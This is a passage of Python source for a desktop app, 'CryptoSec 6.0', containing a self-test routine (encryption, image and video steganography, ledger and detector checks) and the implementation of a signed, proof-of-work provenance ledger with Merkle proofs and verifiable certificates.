            priv, pub = CryptoEngine.rsa_generate_keypair()
            _, plain = decrypt_payload(encrypt_payload("rsa", "hello", pub), priv)
            add(plain == "hello", "Encryption  RSA-2048 Hybrid")
        except Exception as e:
            add(False, f"Encryption  RSA: {e}")
        rep(2, 8, "Testing images…")
        try:
            Image.fromarray(rng.integers(0, 256, (80, 100, 3), dtype=np.uint8)).save(os.path.join(tmp, "t.png"))
            out = image_encode(os.path.join(tmp, "t.png"), "AES:test-payload")
            add(image_decode(out) == "AES:test-payload", "Hide / reveal in a picture (PNG)")
        except Exception as e:
            add(False, f"Picture: {e}")
        rep(3, 8, "Testing video…")
        try:
            src = os.path.join(tmp, "src.avi")
            wr = _RawAviWriter(src, 101, 75, 25.0)          # odd size on purpose
            for _ in range(12):
                wr.write(rng.integers(0, 256, (75, 101, 3), dtype=np.uint8))
            wr.release()
            out, engine = video_encode(src, "AES:video-test-payload")
            ok = video_decode(out) == "AES:video-test-payload"
            add(ok, f"Hide / reveal in a video  —  engine: {engine}")
        except Exception as e:
            add(False, f"Video: {e}")
        rep(4, 8, "Testing blockchain…")
        try:
            home = os.path.join(tmp, "chain")
            os.makedirs(home)
            who = Identity.load_or_create(home, "Tester")
            led = Ledger(os.path.join(home, "ledger.jsonl"))
            fsha = hashlib.sha256(b"self-test").hexdigest()
            tx = make_tx(who, TX_REGISTER, {"file_sha256": fsha, "kind": "image", "cipher": "aes"})
            led.add_transactions([tx, make_tx(who, TX_REVEAL, {"file_sha256": fsha})], MIN_BITS + 4)
            add(led.validate(deep=True)[0] and led.height == 2,
                "Blockchain  proof-of-work, Merkle root, chain validation")
            forged = [dict(b) for b in led.snapshot()]
            forged[1] = dict(forged[1], txs=[dict(forged[1]["txs"][0], ts=1)] + forged[1]["txs"][1:])
            add(not led.validate(deep=True, blocks=forged)[0], "Blockchain  tamper detection")
            cert = led.certificate(tx["txid"])
            add(all(s != "fail" for s, _ in verify_certificate(cert, led, fsha))
                and any(s == "fail" for s, _ in verify_certificate(cert, led, "0" * 64)),
                "Blockchain  signed proof certificate (+ altered-file detection)")
            other = Ledger(os.path.join(home, "other.jsonl"))
            m = other.merge_txs(led.snapshot()[1]["txs"], MIN_BITS + 4)
            add(m["added"] == 2 and bool(other.lookup_file(fsha)["register"]), "Blockchain  ledger merge")
        except Exception as e:
            add(False, f"Blockchain: {e}")
        rep(6, 8, "Checking helpers…")
        ff = _find_ffmpeg()
        add(True, "Video helper (FFmpeg, optional): " + ("found — sound is kept" if ff else
            "not installed (optional) — use the Install button; videos work without it but lose sound"))
        add(True, "Drag & drop (optional): " + ("available" if _DND else "not installed (optional: pip install tkinterdnd2)"))
        if csai is None:
            add(True, "AI engine (optional): cryptosec_ai.py not found next to this file — AI pages are disabled")
        else:
            rep(7, 8, "Testing the AI engine…")
            try:
                import urllib.request as _ur
                h = csai.AIHub(os.path.join(tmp, "aihome"))
                add(csai.url_risk("http://paypal-verify.account-update.tk/login")[0] > 0.6 and csai.url_risk("https://www.wikipedia.org/wiki/Cat")[0] < 0.2, "AI  phishing detector")
                add(h.detectors["dlp"].analyze({"text": "card 4111 1111 1111 1111"})["score"] >= 70, "AI  data-loss-prevention (Luhn-checked card)")
                ev = [csai.norm_event({"ts": 1.7e9 + i, "user": "root", "src_ip": "9.9.9.9", "success": False}) for i in range(12)]
                add(any(f["verdict"] == "brute force" for e in ev for f in h.detectors["password"].observe(e)), "AI  brute-force detection")
                ep = os.path.join(tmp, "eicar.txt")
                with open(ep, "wb") as fh:
                    fh.write(b"EICAR-STANDARD-ANTIVIRUS-TEST-FILE")
                add(h.detectors["malware"].analyze_file(ep)["score"] >= 90, "AI  malware scanner (EICAR test string)")
                rows = [{"text": ("win free prize now" if i % 2 else "meeting at noon tomorrow") + f" {i}", "label": "spam" if i % 2 else "ham"} for i in range(80)]
                tb = csai.load_table(("text,label\n" + "\n".join(f"{r['text']},{r['label']}" for r in rows)).encode(), "t.csv")
                rep_ = h.detectors["spam"].train(tb)
                add(rep_["metrics"].get("accuracy", 0) > 0.9, "AI  trains on an uploaded dataset")
                os.makedirs(os.path.join(tmp, "aiid"), exist_ok=True)
                ident = Identity.load_or_create(os.path.join(tmp, "aiid"), "AI")
                atx = make_tx(ident, TX_AI_SCAN, {"file_sha256": hashlib.sha256(b"x").hexdigest(), "ai": {"verdict": "clean", "score": 1}})
                add(verify_tx(atx)[0], "AI  signed record on the blockchain format")
                api = csai.ApiServer(h, {})
                port = api.start("127.0.0.1", 0)
                rq = _ur.Request(f"http://127.0.0.1:{port}/api/v1/modules", headers={"Authorization": "Bearer " + h.api_key})
                n = len(json.loads(_ur.urlopen(rq, timeout=5).read()))
                api.stop()
                add(n == 19, f"AI  REST API ({n} modules served)")
                h.shutdown()
            except Exception as e:
                add(False, f"AI engine: {type(e).__name__}: {e}")
            try:
                import cryptosec_pg as _cpg
                av = _cpg.availability()
                if not (av["psycopg"] and av["pgserver"]):
                    add(True, "PostgreSQL (optional): not installed — " + av["hint"].strip())
                else:
                    rep(7, 8, "Testing the embedded PostgreSQL…")
                    pgs = _cpg.PgStore(embedded_dir=os.path.join(tmp, "pgdata")).connect()
                    try:
                        pgs.put_alert({"id": "t1", "ts": time.time(), "module": "x", "severity": "high", "score": 80, "subject": "s", "entity": "e",
                                       "reasons": ["r"], "evidence": {}, "mitre": []})
                        for i in range(3):
                            pgs.audit("selftest", "event", {"i": i})
                        pgs.flush(10)
                        add(pgs.count_alerts() == 1 and pgs.recent_alerts(1)[0]["id"] == "t1", "PG  embedded PostgreSQL stores and returns an alert")
                        add(pgs.audit_verify()["ok"], "PG  hash-chained audit log verifies")
                        lg = Ledger(os.path.join(tmp, "pgl.jsonl"))
                        lg.add_transactions([make_tx(ident, TX_AI_SCAN, {"file_sha256": hashlib.sha256(b"y").hexdigest(), "ai": {"verdict": "clean"}})], 12)
                        pgs.mirror_ledger(lg.snapshot())
                        add(pgs.ledger_verify(lg.snapshot())["ok"], "PG  blockchain mirror matches the ledger")
                    finally:
                        pgs.close()
            except Exception as e:
                add(False, f"PostgreSQL: {type(e).__name__}: {e}")
        rep(8, 8)
    finally:
        shutil.rmtree(tmp, ignore_errors=True)
    return res


# ═══════════════════════════════════════════════════════════════════════
#  BLOCKCHAIN LAYER  ·  "CryptoChain" provenance ledger
# ═══════════════════════════════════════════════════════════════════════
#  What it is   : a local, append-only chain of proof-of-work blocks.  Every
#                 time you HIDE or REVEAL something, a digitally signed
#                 transaction is written into a block that is hash-linked to
#                 the previous block and summarised by a Merkle root.
#  What it gives: tamper-evidence, non-repudiation (ECDSA signatures),
#                 proof of origin, delivery receipts, shareable certificates.
#  What it never stores: your message, passphrase, keys or ciphertext —
#                 only SHA-256 fingerprints and a little metadata.
#  Honest limit : a ledger on one computer can be rewritten by its owner.
#                 Signed transactions of OTHER people cannot be forged, and
#                 publishing a "checkpoint" (tip hash) anywhere public makes
#                 any later rewrite detectable.
# ───────────────────────────────────────────────────────────────────────
CHAIN_FORMAT = "cryptosec-chain/1"
PROOF_FORMAT = "cryptosec-proof/1"
CHAIN_VERSION = 1
GENESIS_TS = 1_767_225_600            # 2026-01-01 00:00:00 UTC — one shared root for every ledger
GENESIS_PREV = "0" * 64
MIN_BITS = 8                          # minimum proof-of-work for any non-genesis block
MAX_TX_PER_BLOCK = 64
TX_REGISTER, TX_REVEAL = "REGISTER", "REVEAL"
TX_AI_SCAN, TX_AI_ALERT, TX_AI_CASE, TX_AI_MODEL, TX_AI_AUDIT = "AI_SCAN", "AI_ALERT", "AI_CASE", "AI_MODEL", "AI_AUDIT"
AI_TX = (TX_AI_SCAN, TX_AI_ALERT, TX_AI_CASE, TX_AI_MODEL, TX_AI_AUDIT)     # v6: signed AI records (nodes older than v6 reject these on merge)
TX_LABEL = {TX_REGISTER: "🔒 HIDE", TX_REVEAL: "🔓 REVEAL", TX_AI_SCAN: "🧠 AI SCAN", TX_AI_ALERT: "🚨 AI ALERT",
            TX_AI_CASE: "📁 AI CASE", TX_AI_MODEL: "🧪 AI MODEL", TX_AI_AUDIT: "⚓ AUDIT ANCHOR"}
DIFFICULTY_LEVELS = (("Light", 14, "instant"), ("Standard", 18, "≈ 0.2 s"), ("Strong", 22, "≈ 2–4 s"))
APP_TAG = "CryptoSec 6.0"


def data_dir() -> str:
    """Per-user folder for ledger, identity and settings (override: CRYPTOSEC_HOME)."""
    for cand in (os.environ.get("CRYPTOSEC_HOME"),
                 os.path.join(os.path.expanduser("~"), ".cryptosec"),
                 os.path.join(tempfile.gettempdir(), "cryptosec")):
        if not cand:
            continue
        try:
            os.makedirs(cand, exist_ok=True)
            if os.access(cand, os.W_OK):
                return cand
        except OSError:
            continue
    return os.getcwd()


# ── small helpers ───────────────────────────────────────────────────────
def canon(obj) -> bytes:
    """Canonical JSON — the exact bytes that get hashed and signed."""
    return json.dumps(obj, sort_keys=True, separators=(",", ":"), ensure_ascii=True).encode()


def sha256_hex(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def is_hex64(s) -> bool:
    return isinstance(s, str) and len(s) == 64 and all(c in "0123456789abcdef" for c in s)


def leading_zero_bits(d: bytes) -> int:
    n = 0
    for byte in d:
        if byte == 0:
            n += 8
            continue
        return n + 8 - byte.bit_length()
    return n


def file_sha256(path: str, cb=None) -> str:
    h = hashlib.sha256()
    size = max(1, os.path.getsize(path))
    done = 0
    with open(path, "rb") as f:
        while chunk := f.read(4 << 20):
            h.update(chunk)
            done += len(chunk)
            if cb:
                cb(done, size)
    return h.hexdigest()


def short_hash(h: str, n: int = 10) -> str:
    return (h[:n] + "…") if h else "—"


def short_id(idhex: str) -> str:
    s = (idhex or "")[:16].upper()
    return "·".join(s[i:i + 4] for i in range(0, 16, 4)) if s else "—"


def fmt_time(ts) -> str:
    try:
        return datetime.datetime.fromtimestamp(int(ts)).strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return "?"


# ── Merkle tree (domain-separated; unpaired nodes are promoted, never duplicated)
def _leaf(txid: str) -> bytes:
    return hashlib.sha256(b"\x00" + bytes.fromhex(txid)).digest()


def _node(l: bytes, r: bytes) -> bytes:
    return hashlib.sha256(b"\x01" + l + r).digest()


def merkle_root(txids: list) -> str:
    if not txids:
        return hashlib.sha256(b"").hexdigest()
    level = [_leaf(t) for t in txids]
    while len(level) > 1:
        level = [_node(level[i], level[i + 1]) if i + 1 < len(level) else level[i]
                 for i in range(0, len(level), 2)]
    return level[0].hex()


def merkle_path(txids: list, index: int) -> list:
    level, i, path = [_leaf(t) for t in txids], index, []
    while len(level) > 1:
        if i % 2 == 0:
            if i + 1 < len(level):
                path.append([level[i + 1].hex(), "R"])
        else:
            path.append([level[i - 1].hex(), "L"])
        level = [_node(level[j], level[j + 1]) if j + 1 < len(level) else level[j]
                 for j in range(0, len(level), 2)]
        i //= 2
    return path


def merkle_verify(txid: str, path: list, root: str) -> bool:
    try:
        h = _leaf(txid)
        for sib, side in path:
            s = bytes.fromhex(sib)
            h = _node(h, s) if side == "R" else _node(s, h)
        return h.hex() == root
    except Exception:
        return False


# ── identity & signatures (ECDSA P-256, from pycryptodome) ──────────────
def verify_signature(pub_b64: str, raw: bytes, sig_b64: str) -> bool:
    try:
        key = ECC.import_key(base64.b64decode(pub_b64))
        DSS.new(key, "fips-186-3").verify(SHA256.new(raw), base64.b64decode(sig_b64))
        return True
    except Exception:
        return False


class Identity:
    """Your signing identity.  The ID is the SHA-256 of your public key."""
    FILE = "identity.pem"

    def __init__(self, key, alias: str):
        self.key, self.alias = key, alias
        der = key.public_key().export_key(format="DER")
        self.pub_b64 = base64.b64encode(der).decode()
        self.id = hashlib.sha256(der).hexdigest()

    @classmethod
    def load_or_create(cls, folder: str, alias: str) -> "Identity":
        path = os.path.join(folder, cls.FILE)
        key = None
        if os.path.exists(path):
            try:
                with open(path) as f:
                    key = ECC.import_key(f.read())
            except Exception:
                os.replace(path, path + f".unreadable-{int(time.time())}")
        if key is None:
            key = ECC.generate(curve="P-256")
            with open(path, "w") as f:
                f.write(key.export_key(format="PEM"))
            try:
                os.chmod(path, 0o600)
            except OSError:
                pass
        return cls(key, alias)

    def sign(self, raw: bytes) -> str:
        return base64.b64encode(DSS.new(self.key, "deterministic-rfc6979").sign(SHA256.new(raw))).decode()


class Settings:
    DEFAULTS = dict(ledger=True, names=True, receipts=True, bits=18, alias="")

    def __init__(self, path: str):
        self.path, self.d = path, dict(self.DEFAULTS)
        try:
            with open(path) as f:
                loaded = json.load(f)
            self.d.update({k: v for k, v in loaded.items() if k in self.DEFAULTS})
        except Exception:
            pass
        if not self.d["alias"]:
            self.d["alias"] = os.environ.get("USERNAME") or os.environ.get("USER") or "Me"
        self.d["bits"] = min(28, max(MIN_BITS, int(self.d["bits"] or 18)))

    def __getitem__(self, k):
        return self.d[k]

    def __setitem__(self, k, v):
        self.d[k] = v
        try:
            tmp = self.path + ".tmp"
            with open(tmp, "w") as f:
                json.dump(self.d, f, indent=2)
            os.replace(tmp, self.path)
        except OSError:
            pass


# ── transactions ────────────────────────────────────────────────────────
def make_tx(identity: Identity, ttype: str, data: dict, ts: int | None = None) -> dict:
    body = {"v": 1, "type": ttype, "ts": int(ts if ts is not None else time.time()),
            "signer": {"id": identity.id, "alias": identity.alias, "pub": identity.pub_b64},
            "data": data}
    raw = canon(body)
    return {**body, "txid": sha256_hex(raw), "sig": identity.sign(raw)}


def verify_tx(tx) -> tuple[bool, str]:
    """Self-authenticating: needs nothing but the transaction itself."""
    try:
        body = {k: tx[k] for k in ("v", "type", "ts", "signer", "data")}
        raw = canon(body)
        if sha256_hex(raw) != tx["txid"]:
            return False, "content does not match its transaction ID"
        s = tx["signer"]
        if hashlib.sha256(base64.b64decode(s["pub"])).hexdigest() != s["id"]:
            return False, "signer ID does not match the public key"
        if tx["type"] not in (TX_REGISTER, TX_REVEAL, *AI_TX):
            return False, "unknown transaction type"
        if "ai" in tx["data"] and (not isinstance(tx["data"]["ai"], dict) or len(canon(tx["data"]["ai"])) > 8192):
            return False, "AI report is malformed or too large"
        if not is_hex64(tx["data"].get("file_sha256")):
            return False, "missing file fingerprint"
        if not verify_signature(s["pub"], raw, tx["sig"]):
            return False, "digital signature is invalid"
        return True, "ok"
    except Exception as e:
        return False, f"malformed transaction ({e.__class__.__name__})"


def signer_label(tx: dict, my_id: str | None = None) -> str:
    try:
        s = tx["signer"]
        me = " (YOU)" if my_id and s["id"] == my_id else ""
        alias = str(s.get("alias") or "?")[:40]
        return f"{alias}{me} · ID {short_id(s['id'])}"
    except Exception:
        return "unknown signer"


# ── blocks & proof of work ──────────────────────────────────────────────
def _header(index, prev, merkle, ts, bits) -> bytes:
    return f"CSEC-BLOCK|{CHAIN_VERSION}|{index}|{prev}|{merkle}|{ts}|{bits}|".encode()


def block_hash(b: dict) -> str:
    return sha256_hex(_header(b["index"], b["prev"], b["merkle"], b["ts"], b["bits"]) + str(b["nonce"]).encode())


def mine_block(index: int, prev: str, txs: list, bits: int, progress=None) -> dict:
    merkle = merkle_root([t["txid"] for t in txs])
    ts = int(time.time())
    base = hashlib.sha256(_header(index, prev, merkle, ts, bits))
    target = 1 << (256 - bits)
    nonce = 0
    while True:
        h = base.copy()
        h.update(str(nonce).encode())
        d = h.digest()
        if int.from_bytes(d, "big") < target:
            return {"index": index, "ts": ts, "prev": prev, "merkle": merkle, "bits": bits,
                    "nonce": nonce, "hash": d.hex(), "txs": txs}
        nonce += 1
        if progress and nonce % 25_000 == 0:
            progress(nonce)


class LedgerError(Exception):
    pass


class Ledger:
    """Append-only JSON-Lines file: one block per line (crash-safe, easy to back up)."""

    def __init__(self, path: str):
        self.path = path
        self.lock = threading.RLock()
        self.blocks: list[dict] = []
        self.load_error: str | None = None
        self.status: tuple[bool, list] = (True, [])
        self.status_deep = False          # True once every signature has been re-verified
        self._load()

    # -- genesis / load ---------------------------------------------------
    @staticmethod
    def genesis() -> dict:
        g = {"index": 0, "ts": GENESIS_TS, "prev": GENESIS_PREV, "merkle": merkle_root([]),
             "bits": 0, "nonce": 0, "txs": []}
        g["hash"] = block_hash(g)
        return g

    def _write_line(self, blk: dict):
        with open(self.path, "a", encoding="utf-8") as f:
            f.write(json.dumps(blk, sort_keys=True, separators=(",", ":")) + "\n")
            f.flush()
            os.fsync(f.fileno())

    def _load(self):
        with self.lock:
            self.blocks, self.load_error = [], None
            if os.path.exists(self.path):
                n = 0
                try:
                    with open(self.path, encoding="utf-8") as f:
                        for n, line in enumerate(f, 1):
                            if line.strip():
                                self.blocks.append(json.loads(line))
                except (OSError, ValueError) as e:
                    self.load_error = f"Ledger file is damaged near line {n}: {e}"
            if not self.blocks and self.load_error is None:
                self.blocks = [self.genesis()]
                self._write_line(self.blocks[0])
            self._reindex()

    def _reindex(self):
        self._tx, self._by_file = {}, {}
        for b in self.blocks:
            for t in b.get("txs", []) if isinstance(b, dict) else []:
                try:
                    self._tx[t["txid"]] = (t, b["index"])
                    self._by_file.setdefault(t["data"]["file_sha256"], []).append(t["txid"])
                except Exception:
                    pass
        deep = len(self._tx) <= 600       # signature re-check is cheap up to ~0.3 s; bigger ledgers: on demand
        self.status = self.validate(deep=deep) if self.load_error is None else (False, [(0, self.load_error)])
        self.status_deep = deep

    # -- read access ------------------------------------------------------
    def snapshot(self) -> list:
        with self.lock:
            return list(self.blocks)

    @property
    def height(self) -> int:
        return len(self.blocks)

    @property
    def tip(self) -> dict:
        return self.blocks[-1]

    @property
    def tx_count(self) -> int:
        return len(self._tx)

    @property
    def intact(self) -> bool:
        return self.status[0]

    def get_tx(self, txid: str):
        return self._tx.get(txid)

    def block_by_hash(self, h: str):
        with self.lock:
            return next((b for b in self.blocks if b.get("hash") == h), None)

    def all_txs(self) -> list:
        """[(tx, block_index)] newest first."""
        with self.lock:
            items = list(self._tx.values())
        return sorted(items, key=lambda x: (x[0]["ts"], x[1]), reverse=True)

    def lookup_file(self, sha: str) -> dict:
        with self.lock:
            txs = [self._tx[i] for i in self._by_file.get(sha, []) if i in self._tx]
        key = lambda x: (x[0]["ts"], x[1])
        return {"register": sorted((x for x in txs if x[0]["type"] == TX_REGISTER), key=key),
                "reveal": sorted((x for x in txs if x[0]["type"] == TX_REVEAL), key=key),
                "ai": sorted((x for x in txs if x[0]["type"] in AI_TX), key=key)}

    # -- validation -------------------------------------------------------
    def validate(self, deep: bool = True, blocks: list | None = None, rep=None) -> tuple[bool, list]:
        """Returns (ok, [(block_index, problem)]).  deep=True also re-verifies every signature."""
        blocks = self.snapshot() if blocks is None else blocks
        problems: list = []
        if not blocks:
            return False, [(0, "ledger is empty")]
        g = self.genesis()
        if not isinstance(blocks[0], dict) or blocks[0].get("hash") != g["hash"] or blocks[0].get("txs"):
            problems.append((0, "genesis block is different from the CryptoSec genesis"))
        seen: set = set()
        for i, b in enumerate(blocks):
            if rep and i % 8 == 0:
                rep(i, len(blocks), f"Verifying block {i + 1} of {len(blocks)}…")
            try:
                if b["index"] != i:
                    problems.append((i, "block number is out of sequence"))
                if i > 0:
                    if b["prev"] != blocks[i - 1]["hash"]:
                        problems.append((i, "link to the previous block is broken"))
                    if b["bits"] < MIN_BITS:
                        problems.append((i, "proof-of-work is below the minimum"))
                calc = block_hash(b)
                if calc != b["hash"]:
                    problems.append((i, "block contents do not match the block hash"))
                elif i > 0 and leading_zero_bits(bytes.fromhex(calc)) < b["bits"]:
                    problems.append((i, "proof-of-work is not satisfied"))
                txids = [t["txid"] for t in b["txs"]]
                if merkle_root(txids) != b["merkle"]:
                    problems.append((i, "transactions do not match the Merkle root"))
                for t in b["txs"]:
                    if t["txid"] in seen:
                        problems.append((i, f"duplicate transaction {t['txid'][:8]}…"))
                    seen.add(t["txid"])
                    if deep:
                        ok, why = verify_tx(t)
                        if not ok:
                            problems.append((i, f"transaction {t['txid'][:8]}…: {why}"))
            except Exception as e:
                problems.append((i, f"malformed block ({e.__class__.__name__})"))
        return not problems, problems

    def full_check(self, rep=None) -> tuple[bool, list]:
        """Deep validation (every signature) — stores the result as the ledger status."""
        res = self.validate(deep=True, rep=rep)
        self.status, self.status_deep = res, True
        return res

    def check_block(self, index: int) -> tuple[bool, str]:
        with self.lock:
            b = self.blocks[index] if 0 <= index < len(self.blocks) else None
        if b is None:
            return False, "block not found"
        bad = [p for i, p in self.status[1] if i == index]
        return (not bad), (bad[0] if bad else "ok")

    # -- writing ----------------------------------------------------------
    def _append(self, blk: dict):
        if self.load_error or not self.status[0]:
            raise LedgerError("The ledger failed its integrity check, so nothing can be added to it.\n"
                              "Open the Blockchain page and use “Archive & start fresh”.")
        self._write_line(blk)
        self.blocks.append(blk)
        self._reindex()

    def add_transactions(self, txs: list, bits: int, progress=None) -> list:
        """Mine the transactions into one or more new blocks.  Returns the new blocks."""
        fresh = []
        with self.lock:
            known = set(self._tx)
        for t in txs:
            if t["txid"] not in known:
                known.add(t["txid"])
                fresh.append(t)
        new_blocks = []
        for k in range(0, len(fresh), MAX_TX_PER_BLOCK):
            chunk = fresh[k:k + MAX_TX_PER_BLOCK]
            while True:
                with self.lock:
                    tip_idx, tip_hash = self.tip["index"], self.tip["hash"]
                blk = mine_block(tip_idx + 1, tip_hash, chunk, max(MIN_BITS, int(bits)), progress)
                with self.lock:                      # mined without holding the lock → UI never freezes
                    if self.tip["hash"] != tip_hash:
                        continue
                    self._append(blk)
                new_blocks.append(blk)
                break
        return new_blocks

    def merge_txs(self, txs: list, bits: int, progress=None) -> dict:
        """Adopt transactions from someone else's ledger/certificate.  Each is verified
        on its own (signatures cannot be forged), then sealed into a local block."""
        accepted, known, rejected = [], 0, 0
        for t in txs:
            if isinstance(t, dict) and t.get("txid") in self._tx:
                known += 1
            elif isinstance(t, dict) and verify_tx(t)[0]:
                accepted.append(t)
            else:
                rejected += 1
        blocks = self.add_transactions(accepted, bits, progress) if accepted else []
        return dict(added=len(accepted), known=known, rejected=rejected, blocks=len(blocks))

    def merge_file(self, path: str, bits: int, progress=None) -> dict:
        if os.path.getsize(path) > (256 << 20):
            raise ValueError("This file is too large to be a CryptoSec ledger or certificate.")
        with open(path, encoding="utf-8") as f:
            text = f.read()
        txs: list = []
        try:
            obj = json.loads(text)
            if isinstance(obj, dict) and obj.get("format") == PROOF_FORMAT:
                txs = [obj["tx"]]
            else:
                raise ValueError
        except ValueError:
            for line in text.splitlines():
                if not line.strip():
                    continue
                try:
                    blk = json.loads(line)
                except ValueError:
                    raise ValueError("This is not a CryptoSec ledger (.jsonl) or proof certificate (.csproof).")
                if isinstance(blk, dict) and isinstance(blk.get("txs"), list):
                    txs.extend(blk["txs"])
        if not txs:
            raise ValueError("No transactions were found in this file.")
        return self.merge_txs(txs, bits, progress)

    def archive_and_reset(self) -> str:
        with self.lock:
            dest = self.path + f".archived-{datetime.datetime.now():%Y%m%d-%H%M%S}"
            if os.path.exists(self.path):
                os.replace(self.path, dest)
            self._load()
            return dest

    def export_to(self, dest: str):
        with self.lock:
            shutil.copyfile(self.path, dest)

    # -- anchoring --------------------------------------------------------
    def checkpoint(self) -> str:
        with self.lock:
            return f"CSEC1-{self.height}-{self.tip['hash']}"

    def check_checkpoint(self, text: str) -> tuple[bool, str]:
        try:
            tag, h, tip = text.strip().split("-")
            h = int(h)
            if tag != "CSEC1" or not is_hex64(tip) or h < 1:
                raise ValueError
        except ValueError:
            return False, "That is not a CryptoSec checkpoint (expected  CSEC1-<height>-<hash>)."
        with self.lock:
            if h > self.height:
                return False, (f"Your ledger has only {self.height} blocks, the checkpoint refers to block "
                               f"{h}. Parts of the chain are missing.")
            if self.blocks[h - 1].get("hash") != tip:
                return False, (f"MISMATCH — block #{h - 1} in your ledger is different from the one in the "
                               "checkpoint. The history has been rewritten since the checkpoint was made.")
            return True, (f"Match — block #{h - 1} is exactly as it was when the checkpoint was made; "
                          f"{self.height - h} block(s) were added since.")

    # -- proof certificates -----------------------------------------------
    def certificate(self, txid: str) -> dict | None:
        with self.lock:
            hit = self._tx.get(txid)
            if not hit:
                return None
            tx, bi = hit
            b = self.blocks[bi]
            ids = [t["txid"] for t in b["txs"]]
            return {"format": PROOF_FORMAT, "app": APP_TAG, "generated": int(time.time()), "tx": tx,
                    "block": {k: b[k] for k in ("index", "ts", "prev", "merkle", "bits", "nonce", "hash")},
                    "tx_count": len(ids), "merkle_path": merkle_path(ids, ids.index(txid)),
                    "tip": {"height": self.height, "hash": self.tip["hash"]}}


def verify_certificate(cert, ledger: Ledger | None = None, file_sha: str | None = None,
                       my_id: str | None = None) -> list:
    """Independently checks a proof certificate.  Returns [(status, text)]
    with status in ok / warn / fail / info."""
    out: list = []
    add = lambda s, t: out.append((s, t))
    try:
        if not isinstance(cert, dict) or cert.get("format") != PROOF_FORMAT:
            return [("fail", "This is not a CryptoSec proof certificate.")]
        tx, blk, path = cert["tx"], cert["block"], cert["merkle_path"]
        ok, why = verify_tx(tx)
        add("ok" if ok else "fail",
            f"Digital signature is valid — signed by {signer_label(tx, my_id)}" if ok
            else f"Signature check failed: {why}")
        add("ok" if merkle_verify(tx["txid"], path, blk["merkle"]) else "fail",
            "Transaction is part of the block (Merkle proof checks out)"
            if merkle_verify(tx["txid"], path, blk["merkle"]) else "Merkle proof does not lead to the block")
        h_ok = block_hash(blk) == blk["hash"]
        pow_ok = h_ok and blk["bits"] >= MIN_BITS and leading_zero_bits(bytes.fromhex(blk["hash"])) >= blk["bits"]
        add("ok" if pow_ok else "fail",
            f"Block #{blk['index']} hash and proof-of-work ({blk['bits']} bits) are valid" if pow_ok
            else "Block hash / proof-of-work is invalid")
        if ledger is not None:
            hit = ledger.get_tx(tx["txid"])
            if hit:
                add("ok", f"This transaction is recorded in your own ledger (block #{hit[1]})")
            elif ledger.block_by_hash(blk["hash"]):
                add("warn", "The block exists in your ledger but does not contain this transaction")
            else:
                add("warn", "Not in your ledger yet — the certificate is internally consistent, but you have "
                            "no independent copy. Use  Blockchain → Merge ledger  to add it.")
        if file_sha is not None:
            same = file_sha == tx["data"].get("file_sha256")
            add("ok" if same else "fail",
                "The file matches the fingerprint in the certificate — it has not been altered" if same
                else "The file does NOT match this certificate — it is a different or modified file")
        add("info", f"Claimed time: {fmt_time(tx['ts'])}  (taken from the signer's own clock)")
    except Exception as e:
        add("fail", f"Certificate is damaged or incomplete ({e.__class__.__name__}).")
    return out


def inspect_file(ledger: Ledger, sha: str, my_id: str | None = None) -> tuple[str, str, list]:
    """Looks a file fingerprint up in the ledger.  Returns (level, headline, lines)
    where level is ok / bad / unknown."""
    hits = ledger.lookup_file(sha)
    regs, revs = hits["register"], hits["reveal"]
    lines: list = []
    if not regs:
        lines.append(("warn", "This file's fingerprint is not registered in your ledger."))
        if revs:
            lines.append(("info", f"You have a reveal receipt for it ({len(revs)}×), but not the original registration."))
        lines.append(("info", "If someone sent you this file, ask for their ledger or proof certificate and use "
                              "Blockchain → Merge ledger."))
        return "unknown", "Not in your ledger", lines
    level = "ok"
    for tx, bi in regs[:3]:
        ok, why = verify_tx(tx)
        if ok:
            lines.append(("ok", f"Registered {fmt_time(tx['ts'])} by {signer_label(tx, my_id)} · block #{bi}"))
        else:
            level = "bad"
            lines.append(("fail", f"Registration record is damaged: {why}"))
        bok, bwhy = ledger.check_block(bi)
        if not bok:
            level = "bad"
            lines.append(("fail", f"Block #{bi} failed its integrity check: {bwhy}"))
    if len(regs) > 3:
        lines.append(("info", f"…and {len(regs) - 3} more registration(s)."))
    if ledger.intact:
        lines.append(("ok", f"Ledger chain is intact ({ledger.height} blocks, every link verified)"))
    else:
        level = "bad"
        lines.append(("fail", "Your ledger failed its integrity check — see the Blockchain page."))
    if revs:
        lines.append(("info", f"{len(revs)} reveal receipt(s); latest {fmt_time(revs[-1][0]['ts'])} "
                              f"by {signer_label(revs[-1][0], my_id)}"))
    for tx, bi in hits.get("ai", [])[-3:]:
        a = tx["data"].get("ai", {})
        lines.append(("info", f"🧠 {TX_LABEL.get(tx['type'])} {fmt_time(tx['ts'])} · block #{bi} · "
                              f"{a.get('verdict', a.get('decision', ''))} {('risk ' + str(a['risk'])) if 'risk' in a else ''}".rstrip()))
    first = regs[0][0]
    who = "YOU" if my_id and first["signer"]["id"] == my_id else str(first["signer"].get("alias", "?"))[:40]
    head = f"Authentic — registered by {who}" if level == "ok" else "Warning — ledger record is not trustworthy"
    return level, head, lines


def describe_tx(tx: dict, block_index: int, my_id: str | None = None) -> str:
    ok, why = verify_tx(tx)
    d = tx.get("data", {})
    rows = [("TRANSACTION", TX_LABEL.get(tx.get("type"), tx.get("type", "?"))),
            ("ID", tx.get("txid", "?")),
            ("Block", f"#{block_index}"),
            ("Time", f"{fmt_time(tx.get('ts'))}  (signer's clock)"),
            ("Signed by", signer_label(tx, my_id)),
            ("Signature", "✔ valid" if ok else f"✖ {why}"), ("", "")]
    labels = (("name", "File name"), ("kind", "Media"), ("cipher", "Method"), ("engine", "Engine"),
              ("file_size", "File size"), ("file_sha256", "File SHA-256"), ("cover_sha256", "Cover SHA-256"),
              ("payload_sha256", "Payload SHA-256"), ("ref", "Registration"), ("app", "Software"))
    if isinstance(d.get("ai"), dict):
        a = d["ai"]
        rows.append(("AI report", ", ".join(f"{k}={v}" for k, v in a.items() if not isinstance(v, (dict, list)))[:200]))
    for k, label in labels:
        if d.get(k) not in (None, ""):
            v = human_size(d[k]) if k == "file_size" and isinstance(d[k], (int, float)) else d[k]
            rows.append((label, str(v)))
    w = max(len(r[0]) for r in rows) + 2
    return "\n".join(f"{a:<{w}}{b}" if a else "" for a, b in rows)


def certificate_html(cert: dict, my_id: str | None = None) -> str:
    """A printable, self-contained certificate page.  Every value is HTML-escaped."""
    e = lambda x: html.escape(str(x))
    tx, blk, d = cert["tx"], cert["block"], cert["tx"].get("data", {})
